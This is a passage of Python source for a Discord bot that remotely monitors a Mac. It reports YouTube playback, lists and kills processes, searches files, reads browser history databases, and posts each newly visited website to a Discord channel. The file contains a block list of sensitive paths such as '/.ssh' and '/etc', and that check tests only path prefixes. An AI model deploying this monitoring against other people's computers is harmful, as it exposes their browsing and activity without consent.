            '      return theResult\n'
            '    end if\n'
            '  end repeat\n'
            '  return theResult\n'
            'end tell'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def get_youtube_playing_info():
    """Return now-playing info when YouTube is playing in Chrome/Brave/Edge/Vivaldi/Opera or Safari, else None."""
    # JavaScript to collect: position, duration, title, channel, url, artwork, state
    js = (
        "var v=document.querySelector('video');"
        "var url=location.href;"
        "var title=document.title||'';"
        "var chEl=document.querySelector('#owner-name a, ytd-channel-name a, ytd-video-owner-renderer a');"
        "var channel=chEl?chEl.textContent.trim():'';"
        "var id='';try{id=(new URL(url)).searchParams.get('v')||'';}catch(e){id='';}"
        "var art=id?('https://i.ytimg.com/vi/'+id+'/hqdefault.jpg'):'';"
        "var state=(v&& !v.paused)?'playing':(v?'paused':'stopped');"
        "(v?v.currentTime:0)+'\\t'+(v?v.duration:0)+'\\t'+title+'\\t'+channel+'\\t'+url+'\\t'+art+'\\t'+state;"
    )

    chromium_apps = [
        'Google Chrome',
        'Brave Browser',
        'Microsoft Edge',
        'Vivaldi',
        'Opera',
    ]

    # Try Chromium-based browsers first
    for app in chromium_apps:
        if is_process_running([app]):
            out = _run_js_in_chromium_app(app, js)
            if out:
                parts = out.split('\t')
                if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                    try:
                        position = float(parts[0])
                    except Exception:
                        position = 0.0
                    try:
                        duration = float(parts[1])
                    except Exception:
                        duration = 0.0
                    title = parts[2]
                    channel = parts[3]
                    artwork_url = parts[5] if parts[5] else None
                    state = parts[6] if parts[6] else 'unknown'
                    return {
                        'app': f'YouTube ({app})',
                        'title': title,
                        'artist': channel or 'Unknown',
                        'album': 'YouTube',
                        'duration': duration,
                        'position': position,
                        'state': state,
                        'artwork_url': artwork_url,
                        'artwork_path': None,
                    }

    # Try any YouTube tab in Chromium browsers
    for app in chromium_apps:
        if is_process_running([app]):
            out = _run_js_in_chromium_app_any_youtube_tab(app, js)
            if out:
                parts = out.split('\t')
                if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                    try:
                        position = float(parts[0])
                    except Exception:
                        position = 0.0
                    try:
                        duration = float(parts[1])
                    except Exception:
                        duration = 0.0
                    title = parts[2]
                    channel = parts[3]
                    artwork_url = parts[5] if parts[5] else None
                    state = parts[6] if parts[6] else 'unknown'
                    return {
                        'app': f'YouTube ({app})',
                        'title': title,
                        'artist': channel or 'Unknown',
                        'album': 'YouTube',
                        'duration': duration,
                        'position': position,
                        'state': state,
                        'artwork_url': artwork_url,
                        'artwork_path': None,
                    }

    # Try Safari
    if is_process_running(['Safari']):
        out = _run_js_in_safari(js)
        if out:
            parts = out.split('\t')
            if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                try:
                    position = float(parts[0])
                except Exception:
                    position = 0.0
                try:
                    duration = float(parts[1])
                except Exception:
                    duration = 0.0
                title = parts[2]
                channel = parts[3]
                artwork_url = parts[5] if parts[5] else None
                state = parts[6] if parts[6] else 'unknown'
                return {
                    'app': 'YouTube (Safari)',
                    'title': title,
                    'artist': channel or 'Unknown',
                    'album': 'YouTube',
                    'duration': duration,
                    'position': position,
                    'state': state,
                    'artwork_url': artwork_url,
                    'artwork_path': None,
                }

    # Any YouTube tab in Safari
    if is_process_running(['Safari']):
        out = _run_js_in_safari_any_youtube_tab(js)
        if out:
            parts = out.split('\t')
            if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                try:
                    position = float(parts[0])
                except Exception:
                    position = 0.0
                try:
                    duration = float(parts[1])
                except Exception:
                    duration = 0.0
                title = parts[2]
                channel = parts[3]
                artwork_url = parts[5] if parts[5] else None
                state = parts[6] if parts[6] else 'unknown'
                return {
                    'app': 'YouTube (Safari)',
                    'title': title,
                    'artist': channel or 'Unknown',
                    'album': 'YouTube',
                    'duration': duration,
                    'position': position,
                    'state': state,
                    'artwork_url': artwork_url,
                    'artwork_path': None,
                }
    return None

def _chromium_media_control(app_name: str, action: str) -> bool:
    # Uses Media Session JS API or key simulation inside the tab if possible
    js_map = {
        'play': "(()=>{var v=document.querySelector('video');if(!v)return false; if(v.paused){v.play();}else{v.pause();} return true;})()",
        'next': "(()=>{var btn=document.querySelector('.ytp-next-button, ytd-player .ytp-next-button'); if(btn){btn.click(); return true;} return false;})()",
        'prev': "(()=>{var btn=document.querySelector('.ytp-prev-button, ytd-player .ytp-prev-button'); if(btn){btn.click(); return true;} return false;})()",
    }
    js = js_map.get(action)
    if not js:
        return False
    out = _run_js_in_chromium_app(app_name, js)
    return out.strip().lower() == 'true'

def _safari_media_control(action: str) -> bool:
    js_map = {
        'play': "(()=>{var v=document.querySelector('video');if(!v)return false; if(v.paused){v.play();}else{v.pause();} return true;})()",
        'next': "(()=>{var btn=document.querySelector('.ytp-next-button, ytd-player .ytp-next-button'); if(btn){btn.click(); return true;} return false;})()",
        'prev': "(()=>{var btn=document.querySelector('.ytp-prev-button, ytd-player .ytp-prev-button'); if(btn){btn.click(); return true;} return false;})()",
    }
    js = js_map.get(action)
    if not js:
        return False
    out = _run_js_in_safari(js)
    return out.strip().lower() == 'true'

def _activate_app(app_name: str) -> bool:
    try:
        result = subprocess.run(['osascript', '-e', f'tell application "{app_name}" to activate'], capture_output=True, text=True, check=False)
        return result.returncode == 0
    except Exception:
        return False

# Utility functions for new commands
async def search_files_async(query: str, path: str, mode: str = 'name_glob', content: str = None, 
                           limit: int = 100, depth: int = 6, include_hidden: bool = False, 
                           timeout: float = 30.0):
    """Search for files asynchronously with various filters."""
    import time
    from datetime import datetime
    
    def _search_files():
        results = []
        start_time = time.time()
        search_path = Path(path).expanduser().resolve()
        
        if not search_path.exists():
            return {'error': f"Path does not exist: {path}"}
        
        try:
            for root, dirs, files in os.walk(str(search_path)):
                # Check timeout
                if time.time() - start_time > timeout:
                    return {'results': results, 'partial': True, 'message': 'Search timed out after 30s'}
                
                # Calculate current depth
                current_depth = len(Path(root).relative_to(search_path).parts)
                if current_depth >= depth:
                    dirs.clear()  # Don't recurse deeper
                    continue
                
                # Filter hidden directories if not included
                if not include_hidden:
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                
                for filename in files:
                    # Skip hidden files if not included
                    if not include_hidden and filename.startswith('.'):
                        continue
                    
                    # Check file name match
                    name_match = False
                    if mode == 'name_glob':
                        try:
                            name_match = fnmatch.fnmatch(filename, query)
                        except Exception:
                            continue
                    elif mode == 'name_regex':
                        try:
                            name_match = bool(re.search(query, filename))
                        except Exception:
                            continue
                    elif mode == 'name_partial':
                        # Partial matching - case insensitive substring search
                        try:
                            name_match = query.lower() in filename.lower()
                        except Exception:
                            continue
                    
                    if name_match:
                        file_path = Path(root) / filename
                        try:
                            stat_info = file_path.stat()
                            file_size = stat_info.st_size
                            mod_time = datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M')
                            
                            # Add matched file to results (no content filtering)
                            results.append({
                                'path': str(file_path),
                                'size': file_size,
                                'modified': mod_time
                            })
                            
                            if len(results) >= limit:
                                return {'results': results, 'partial': False}
                        except Exception:
                            continue
            
            return {'results': results, 'partial': False}
        except Exception as e:
            return {'error': f"Search error: {str(e)}"}
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _search_files)

async def search_processes_async(name: str = None, pid: int = None, mode: str = 'name_substring',
                               limit: int = 15, sort_by: str = 'cpu'):
    """Search for processes asynchronously with filtering and sorting."""
    
    def _search_processes():
        try:
            processes = []
            
            # Warm up CPU measurement if sorting by CPU
            if sort_by == 'cpu':
                for proc in psutil.process_iter(['pid']):
                    try:
                        proc.cpu_percent()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                time.sleep(0.2)  # Brief pause for CPU measurement
            
            # Collect process information
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info', 'create_time', 'cmdline']):
                try:
                    info = proc.info
                    proc_pid = info.get('pid')
                    proc_name = info.get('name', '')
                    
                    # Apply filters
                    if pid is not None:
                        if proc_pid != pid:
                            continue
                    elif name is not None:
                        if mode == 'name_substring':
                            if name.lower() not in proc_name.lower():
                                continue
                        elif mode == 'name_regex':
                            try:
                                if not re.search(name, proc_name, re.IGNORECASE):
                                    continue
                            except Exception:
                                continue
                    else:
                        return {'error': 'Either name or pid must be provided'}
                    
                    # Get additional info
                    try:
                        cpu_percent = proc.cpu_percent() if sort_by == 'cpu' else 0.0
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        cpu_percent = 0.0
                    
                    try:
                        memory_mb = info.get('memory_info').rss / (1024 * 1024) if info.get('memory_info') else 0.0
                    except (AttributeError, TypeError):
                        memory_mb = 0.0
                    
                    try:
                        username = info.get('username', 'unknown')
                    except Exception:
                        username = 'unknown'
                    
                    try:
                        create_time = info.get('create_time', 0)
                        uptime_seconds = time.time() - create_time if create_time else 0
                        uptime_str = f"{int(uptime_seconds // 3600)}h{int((uptime_seconds % 3600) // 60)}m"
                    except Exception:
                        uptime_str = 'unknown'
                    
                    try:
                        cmdline = info.get('cmdline', [])
                        cmd_str = ' '.join(cmdline[:3]) if cmdline else proc_name  # First 3 args
                        if len(cmd_str) > 50:
                            cmd_str = cmd_str[:47] + "..."
                    except Exception:
                        cmd_str = proc_name
                    
                    processes.append({
                        'pid': proc_pid,
                        'name': proc_name,
                        'username': username,
                        'cpu_percent': cpu_percent,
                        'memory_mb': memory_mb,
                        'uptime': uptime_str,
                        'cmdline': cmd_str
                    })
                    
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Sort processes
            if sort_by == 'cpu':
                processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
            elif sort_by == 'mem':
                processes.sort(key=lambda x: x['memory_mb'], reverse=True)
            elif sort_by == 'pid':
                processes.sort(key=lambda x: x['pid'])
            elif sort_by == 'name':
                processes.sort(key=lambda x: x['name'].lower())
            
            return {'results': processes[:limit]}
            
        except Exception as e:
            return {'error': f"Process search error: {str(e)}"}
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _search_processes)

def is_protected_process(pid: int, name: str) -> bool:
    """Check if a process is protected and should not be terminated."""
    # Current bot process
    if pid == os.getpid():
        return True
    
    # System critical PID 1
    if pid == 1:
        return True
    
    # Protected macOS processes (case-insensitive)
    protected_names = {
        'kernel_task', 'launchd', 'windowserver', 'loginwindow', 'systemstats', 
        'syslogd', 'configd', 'coreaudiod', 'mds', 'mds_stores', 'distnoted', 
        'bluetoothd', 'opendirectoryd', 'cfprefsd', 'powerd', 'dock', 'finder', 
        'spotlightd', 'tccd'
    }
    
    name_lower = name.lower()
    return any(protected in name_lower for protected in protected_names)

def is_authorized_user(user_id: int, guild_owner_id: int) -> bool:
    """Check if user is authorized to use the kill command."""
    # Guild owner is always authorized
    if user_id == guild_owner_id:
        return True
    
    # Check against allowed user IDs
    if ALLOWED_USER_IDS:
        allowed_ids = [id.strip() for id in ALLOWED_USER_IDS.split(',') if id.strip()]
        return str(user_id) in allowed_ids
    
    return False

def is_pc_monitor_channel(interaction: discord.Interaction) -> bool:
    """Check if the command is being used in the pc-monitor channel."""
    return interaction.channel.name == 'pc-monitor'

async def terminate_process_async(pid: int = None, name: str = None, signal_type: str = 'TERM', 
                                force: bool = False):
    """Terminate a process asynchronously with safety checks."""
    
    def _terminate_process():
        try:
            # Resolve target process
            if pid is not None:
                try:
                    proc = psutil.Process(pid)
                    proc_name = proc.name()
                except psutil.NoSuchProcess:
                    return {'error': f"Process with PID {pid} not found"}
                except psutil.AccessDenied:
                    return {'error': f"Access denied to process with PID {pid}"}
            elif name is not None:
                # Find processes by name
                matching_procs = []
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if name.lower() in proc.info['name'].lower():
                            matching_procs.append((proc.info['pid'], proc.info['name']))
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                if not matching_procs:
                    return {'error': f"No process found with name containing '{name}'"}
                elif len(matching_procs) > 1:
                    proc_list = '\n'.join([f"PID {p[0]}: {p[1]}" for p in matching_procs[:10]])
                    return {'error': f"Multiple processes found. Please specify PID:\n{proc_list}"}
                else:
                    pid, proc_name = matching_procs[0]
                    try:
                        proc = psutil.Process(pid)
                    except psutil.NoSuchProcess:
                        return {'error': f"Process {proc_name} (PID {pid}) no longer exists"}
            else:
                return {'error': "Either pid or name must be provided"}
            
            # Safety check - protected processes
            if is_protected_process(pid, proc_name):
                return {'error': "This process is protected and cannot be terminated"}
            
            # Attempt termination
            try:
                if signal_type == 'KILL':
                    proc.kill()
                    time.sleep(2)  # Wait for termination
                    if proc.is_running():
                        return {'error': f"Failed to kill {proc_name} (PID {pid})"}
                    else:
                        return {'success': f"Terminated {proc_name} (PID {pid}) with SIGKILL"}
                else:  # TERM
                    proc.terminate()
                    time.sleep(3)  # Wait for graceful termination
                    
                    if proc.is_running():
                        if force:
                            # Escalate to KILL
                            proc.kill()
                            time.sleep(2)
                            if proc.is_running():
                                return {'error': f"Failed to terminate {proc_name} (PID {pid}) even with force"}
                            else:
                                return {'success': f"Terminated {proc_name} (PID {pid}) with SIGTERM, escalated to SIGKILL"}
                        else:
                            return {'error': f"Process {proc_name} (PID {pid}) did not terminate gracefully. Use force=true to escalate"}
                    else:
                        return {'success': f"Terminated {proc_name} (PID {pid}) with SIGTERM"}
                        
            except psutil.NoSuchProcess:
                return {'success': f"Process {proc_name} (PID {pid}) already terminated"}
            except psutil.AccessDenied:
                return {'error': f"Access denied - cannot terminate {proc_name} (PID {pid})"}
            except Exception as e:
                return {'error': f"Failed to terminate process: {str(e)}"}
                
        except Exception as e:
            return {'error': f"Termination error: {str(e)}"}
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _terminate_process)


def control_youtube_media(action: str):
    """Attempt to control YouTube playback in common browsers. Returns (success, message)."""
    chromium_apps = ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']
    for app in chromium_apps:
        if is_process_running([app]):
            # Ensure we're on a YouTube tab
            check = _run_js_in_chromium_app(app, "location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
            if check.strip().lower() == 'true':
                if _chromium_media_control(app, action):
                    return True, f"Media action '{action}' sent to YouTube ({app})"
                # Fallback: try any YouTube tab across windows
                check_any = _run_js_in_chromium_app_any_youtube_tab(app, "location.href")
                if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                    if _chromium_media_control(app, action):
                        return True, f"Media action '{action}' sent to YouTube ({app}) via fallback"
                # Final fallback: activate app and simulate keystrokes
    if is_process_running(['Safari']):
        check = _run_js_in_safari("location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
        if check.strip().lower() == 'true':
            if _safari_media_control(action):
                return True, f"Media action '{action}' sent to YouTube (Safari)"
            check_any = _run_js_in_safari_any_youtube_tab("location.href")
            if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                if _safari_media_control(action):
                    return True, f"Media action '{action}' sent to YouTube (Safari) via fallback"
    return False, "No supported media tab is active"

def get_running_browsers():
    """Get list of currently running browsers."""
    browsers = []
    browser_list = [
        'Google Chrome', 'Safari', 'Firefox', 'Brave Browser', 
        'Microsoft Edge', 'Opera', 'Vivaldi'
    ]
    
    for browser in browser_list:
        if is_process_running([browser]):
            browsers.append(browser)
    return browsers

def get_browser_tabs(browser_name="all"):
    """Get open tabs from specified browser or all browsers."""
    tabs = []
    
    if browser_name == "all":
        browsers = get_running_browsers()
    else:
        browsers = [browser_name] if is_process_running([browser_name]) else []
    
    for browser in browsers:
        if browser == 'Safari':
            tabs.extend(_get_safari_tabs())
        elif browser in ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']:
            tabs.extend(_get_chromium_tabs(browser))
        elif browser == 'Firefox':
            tabs.extend(_get_firefox_tabs())
    
    return tabs

def _get_safari_tabs():
    """Get all open tabs from Safari."""
    tabs = []
    try:
        script = '''
        tell application "Safari"
            set tabList to {}
            if (count of documents) > 0 then
                repeat with w from 1 to count of windows
                    repeat with t from 1 to count of tabs of window w
                        set tabInfo to {URL of tab t of window w, name of tab t of window w}
                        set tabList to tabList & {tabInfo}
                    end repeat
                end repeat
            end if
            return tabList
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode == 0 and result.stdout.strip():
            # Parse AppleScript list output
            output = result.stdout.strip()
            # Simple parsing of AppleScript list format
            if output and output != '{}':
                # This is a simplified parser - AppleScript list format can be complex
                lines = output.split(', ')
                for i in range(0, len(lines), 2):
                    if i + 1 < len(lines):
                        url = lines[i].strip().strip('{"')
                        title = lines[i + 1].strip().strip('"}')
                        if url and url != 'missing value':
                            tabs.append({
                                'browser': 'Safari',
                                'title': title,
                                'url': url,
                                'window': (i // 2) + 1
                            })
    except Exception as e:
        logger.error(f"Error getting Safari tabs: {str(e)}")
    return tabs

def _get_chromium_tabs(browser_name):
    """Get all open tabs from Chromium-based browsers."""
    tabs = []
    try:
        script = f'''
        tell application "{browser_name}"
            set tabList to {{}}
            if (count of windows) > 0 then
                repeat with w from 1 to count of windows
                    repeat with t from 1 to count of tabs of window w
                        set tabInfo to {{URL of tab t of window w, title of tab t of window w}}
                        set tabList to tabList & {{tabInfo}}
                    end repeat
                end repeat
            end if
            return tabList
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode == 0 and result.stdout.strip():
            output = result.stdout.strip()
            if output and output != '{}':
                # Simple parsing of AppleScript list format
                lines = output.split(', ')
                for i in range(0, len(lines), 2):
                    if i + 1 < len(lines):
                        url = lines[i].strip().strip('{"')
                        title = lines[i + 1].strip().strip('"}')
                        if url and url != 'missing value':
                            tabs.append({
                                'browser': browser_name,
                                'title': title,
                                'url': url,
                                'window': (i // 2) + 1
                            })
    except Exception as e:
        logger.error(f"Error getting {browser_name} tabs: {str(e)}")
    return tabs

def _get_firefox_tabs():
    """Get all open tabs from Firefox using AppleScript."""
    tabs = []
    try:
        # Firefox AppleScript support is limited, try basic approach
        script = '''
        tell application "Firefox"
            set windowCount to count of windows
            if windowCount > 0 then
                return "Firefox has " & windowCount & " window(s) open"
            else
                return "No Firefox windows"
            end if
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode == 0:
            # Firefox has limited AppleScript support, return basic info
            tabs.append({
                'browser': 'Firefox',
                'title': 'Firefox Browser',
                'url': 'Limited AppleScript support',
                'window': 1
            })
    except Exception as e:
        logger.error(f"Error getting Firefox tabs: {str(e)}")
    return tabs

def get_browser_history(browser_name="all", hours=24, limit=50):
    """Get browser history from databases."""
    import sqlite3
    import shutil
    import tempfile
    
    all_history = []
    
    if browser_name == "all":
        all_history.extend(read_chrome_history(limit, hours))
        all_history.extend(read_safari_history(limit, hours))
        all_history.extend(read_firefox_history(limit, hours))
    elif browser_name == "Google Chrome":
        all_history.extend(read_chrome_history(limit, hours))
    elif browser_name == "Safari":
        all_history.extend(read_safari_history(limit, hours))
    elif browser_name == "Firefox":
        all_history.extend(read_firefox_history(limit, hours))
    
    # Sort by timestamp (most recent first) and limit
    all_history.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
    return all_history[:limit]

def read_chrome_history(limit, hours):
    """Read Chrome browser history from database."""
    import sqlite3
    import shutil
    import tempfile
    
    history = []
    chrome_history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
    
    if not os.path.exists(chrome_history_path):
        return history
    
    try:
        # Create temporary copy since Chrome might have the DB locked
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            shutil.copy2(chrome_history_path, temp_file.name)
            temp_db_path = temp_file.name
        
        # Calculate time cutoff
        cutoff_time = int((datetime.now().timestamp() - hours * 3600) * 1000000)  # Chrome uses microseconds
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        query = '''
        SELECT url, title, visit_count, last_visit_time
        FROM urls 
        WHERE last_visit_time > ?
        ORDER BY last_visit_time DESC 
        LIMIT ?
        '''
        
        cursor.execute(query, (cutoff_time, limit))
        rows = cursor.fetchall()
        
        for row in rows:
            url, title, visit_count, last_visit_time = row
            # Convert Chrome timestamp to Unix timestamp
            timestamp = (last_visit_time - 11644473600000000) / 1000000
            history.append({
                'browser': 'Google Chrome',
                'url': url,
                'title': title or 'No Title',
                'visit_count': visit_count,
                'timestamp': timestamp,
                'last_visit': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
            })
        
        conn.close()
        os.unlink(temp_db_path)  # Clean up temp file
        
    except Exception as e:
        logger.error(f"Error reading Chrome history: {str(e)}")
        if 'temp_db_path' in locals() and os.path.exists(temp_db_path):
            os.unlink(temp_db_path)
    
    return history

def read_safari_history(limit, hours):
    """Read Safari browser history from database."""
    import sqlite3
    import shutil
    import tempfile
    
    history = []
    safari_history_path = os.path.expanduser('~/Library/Safari/History.db')
    
    if not os.path.exists(safari_history_path):
        return history
    
    try:
        # Create temporary copy
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            shutil.copy2(safari_history_path, temp_file.name)
            temp_db_path = temp_file.name
        
        # Calculate time cutoff (Safari uses Core Data timestamp)
        cutoff_time = datetime.now().timestamp() - hours * 3600
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        query = '''
        SELECT url, title, visit_count, visit_time
        FROM history_items hi
        JOIN history_visits hv ON hi.id = hv.history_item
        WHERE visit_time > ?
        ORDER BY visit_time DESC 
        LIMIT ?
        '''
        
        cursor.execute(query, (cutoff_time, limit))
        rows = cursor.fetchall()
        
        for row in rows:
            url, title, visit_count, visit_time = row
            history.append({
                'browser': 'Safari',
                'url': url,
                'title': title or 'No Title',
                'visit_count': visit_count or 1,
                'timestamp': visit_time,
                'last_visit': datetime.fromtimestamp(visit_time).strftime('%Y-%m-%d %H:%M:%S')
            })
        
        conn.close()
        os.unlink(temp_db_path)
        
    except Exception as e:
        logger.error(f"Error reading Safari history: {str(e)}")
        if 'temp_db_path' in locals() and os.path.exists(temp_db_path):
            os.unlink(temp_db_path)
    
    return history

def read_firefox_history(limit, hours):
    """Read Firefox browser history from database."""
    import sqlite3
    import shutil
    import tempfile
    import glob
    
    history = []
    
    # Find Firefox profile directory
    firefox_profiles = glob.glob(os.path.expanduser('~/Library/Application Support/Firefox/Profiles/*/places.sqlite'))
    
    if not firefox_profiles:
        return history
    
    try:
        # Use the first (or most recent) profile found
        firefox_history_path = firefox_profiles[0]
        
        # Create temporary copy
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            shutil.copy2(firefox_history_path, temp_file.name)
            temp_db_path = temp_file.name
        
        # Calculate time cutoff (Firefox uses microseconds since Unix epoch)
        cutoff_time = int((datetime.now().timestamp() - hours * 3600) * 1000000)
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        query = '''
        SELECT p.url, p.title, p.visit_count, h.visit_date
        FROM moz_places p
        JOIN moz_historyvisits h ON p.id = h.place_id
        WHERE h.visit_date > ?
        ORDER BY h.visit_date DESC 
        LIMIT ?
        '''
        
        cursor.execute(query, (cutoff_time, limit))
        rows = cursor.fetchall()
        
        for row in rows:
            url, title, visit_count, visit_date = row
            timestamp = visit_date / 1000000  # Convert from microseconds
            history.append({
                'browser': 'Firefox',
                'url': url,
                'title': title or 'No Title',
                'visit_count': visit_count or 1,
                'timestamp': timestamp,
                'last_visit': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
            })
        
        conn.close()
        os.unlink(temp_db_path)
        
    except Exception as e:
        logger.error(f"Error reading Firefox history: {str(e)}")
        if 'temp_db_path' in locals() and os.path.exists(temp_db_path):
            os.unlink(temp_db_path)
    
    return history

def get_active_website_info():
    """Get currently active website information from the frontmost browser."""
    try:
        running_browsers = get_running_browsers()
        if not running_browsers:
            return None
        
        # Try to get active tab from each running browser
        for browser in running_browsers:
            if browser == 'Safari':
                info = _get_safari_active_tab()
                if info:
                    return info
            elif browser in ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']:
                info = _get_chromium_active_tab(browser)
                if info:
                    return info
        
        return None
    except Exception as e:
        logger.error(f"Error getting active website info: {str(e)}")
        return None

def _get_safari_active_tab():
    """Get active tab info from Safari."""
    try:
        script = '''
        tell application "Safari"
            if (count of documents) > 0 then
                set activeTab to current tab of front document
                return {URL of activeTab, name of activeTab}
            else
                return {}
            end if
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode == 0 and result.stdout.strip():
            output = result.stdout.strip()
            if output and output != '{}':
                parts = output.split(', ')
                if len(parts) >= 2:
                    url = parts[0].strip().strip('{"')
                    title = parts[1].strip().strip('"}')
                    return {
                        'browser': 'Safari',
                        'title': title,
                        'url': url
                    }
    except Exception:
        pass
    return None

def _get_chromium_active_tab(browser_name):
    """Get active tab info from Chromium-based browser."""
    try:
        script = f'''
        tell application "{browser_name}"
            if (count of windows) > 0 then
                set activeTab to active tab of front window
                return {{URL of activeTab, title of activeTab}}
            else
                return {{}}
            end if
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode == 0 and result.stdout.strip():
            output = result.stdout.strip()
            if output and output != '{}':
                parts = output.split(', ')
                if len(parts) >= 2:
                    url = parts[0].strip().strip('{"')
                    title = parts[1].strip().strip('"}')
                    return {
                        'browser': browser_name,
                        'title': title,
                        'url': url
                    }
    except Exception:
        pass
    return None

def website_monitor_loop():
    """Background thread function for website monitoring."""
    global website_monitor_active, last_active_url, website_monitor_channel
    
    while website_monitor_active:
        try:
            current_info = get_active_website_info()
            
            if current_info and website_monitor_channel:
                current_url = current_info['url']
                
                # Check if the active website changed
                if current_url != last_active_url and current_url != 'missing value':
                    last_active_url = current_url
                    
                    # Send update to Discord
                    title = current_info['title'][:100] + "..." if len(current_info['title']) > 100 else current_info['title']
                    url = current_info['url'][:100] + "..." if len(current_info['url']) > 100 else current_info['url']
                    
                    message = f"🌐 **Website Changed**\n"
                    message += f"**Browser**: {current_info['browser']}\n"
                    message += f"**Title**: {title}\n"
                    message += f"**URL**: `{url}`\n"
                    message += f"**Time**: {datetime.now().strftime('%H:%M:%S')}"
                    
                    asyncio.run_coroutine_threadsafe(
                        website_monitor_channel.send(message),
                        bot.loop
                    )
            
            # Wait before next check (default 30 seconds)
            time.sleep(30)
            
        except Exception as e:
            logger.error(f"Error in website monitor loop: {str(e)}")
            time.sleep(30)

def start_website_monitor(channel, interval=30):
    """Start website monitoring in background thread."""
    global website_monitor_active, website_monitor_thread, website_monitor_channel
    
    if website_monitor_active:
        return False, "Website monitor is already running"
    
    website_monitor_active = True
    website_monitor_channel = channel
    website_monitor_thread = threading.Thread(target=website_monitor_loop, daemon=True)
    website_monitor_thread.start()
    
    return True, f"Website monitor started (checking every {interval} seconds)"

def stop_website_monitor():
    """Stop website monitoring."""
    global website_monitor_active, website_monitor_thread, website_monitor_channel, last_active_url
    
    if not website_monitor_active:
        return False, "Website monitor is not running"
    
    website_monitor_active = False
    website_monitor_channel = None
    last_active_url = ""
    
    # Wait for thread to finish
    if website_monitor_thread and website_monitor_thread.is_alive():
        website_monitor_thread.join(timeout=5)
    
    return True, "Website monitor stopped"

def is_url(target):
    """Check if target is a URL."""
    return (target.startswith(('http://', 'https://')) or 
            ('.' in target and ' ' not in target and not target.startswith('/')))

def resolve_app_name(name):
    """Resolve app name aliases to full application names."""
    app_aliases = {
        'chrome': 'Google Chrome',
        'safari': 'Safari',
        'firefox': 'Firefox',
        'brave': 'Brave Browser',
        'edge': 'Microsoft Edge',
        'vscode': 'Visual Studio Code',
        'code': 'Visual Studio Code',
        'spotify': 'Spotify',
        'discord': 'Discord',
        'terminal': 'Terminal',
        'calc': 'Calculator',
        'calculator': 'Calculator',
        'notes': 'Notes',
        'finder': 'Finder',
        'activity': 'Activity Monitor',
        'monitor': 'Activity Monitor',
        'preferences': 'System Preferences',
        'settings': 'System Preferences',
        'photoshop': 'Adobe Photoshop 2024',
        'ps': 'Adobe Photoshop 2024',
        'xcode': 'Xcode',
        'docker': 'Docker Desktop',
        'github': 'GitHub Desktop',
        'slack': 'Slack',
        'zoom': 'zoom.us',
        'teams': 'Microsoft Teams',
        'mail': 'Mail',
        'calendar': 'Calendar',
        'facetime': 'FaceTime',
        'messages': 'Messages',
        'maps': 'Maps',
        'music': 'Music',
        'tv': 'TV',
        'photos': 'Photos',
        'preview': 'Preview'
    }
    return app_aliases.get(name.lower(), name)

def validate_target_safety(target):
    """Validate that target is safe to open."""
    # Block dangerous system files and directories
    dangerous_paths = [
        '/System', '/usr/bin', '/bin', '/sbin',
        '/.ssh', '/etc', '/var/log'
    ]
    
    # Check for dangerous file extensions
    dangerous_extensions = [
        '.sh', '.command', '.app/Contents/MacOS',
        '.scpt', '.scptd'
    ]
    
    target_lower = target.lower()
    
    # Block dangerous paths
    for dangerous in dangerous_paths:
        if target.startswith(dangerous):
            return False, f"Access to {dangerous} is restricted for security"
    
    # Block dangerous extensions
    for ext in dangerous_extensions:
        if target_lower.endswith(ext):
            return False, f"Cannot open {ext} files for security reasons"
    
    return True, "Target is safe"

def open_application(app_name, args=None):
    """Open an application using macOS open command."""
    try:
        resolved_name = resolve_app_name(app_name)
        cmd = ['open', '-a', resolved_name]
        
        if args:
            cmd.extend(['--args'] + args.split())
        
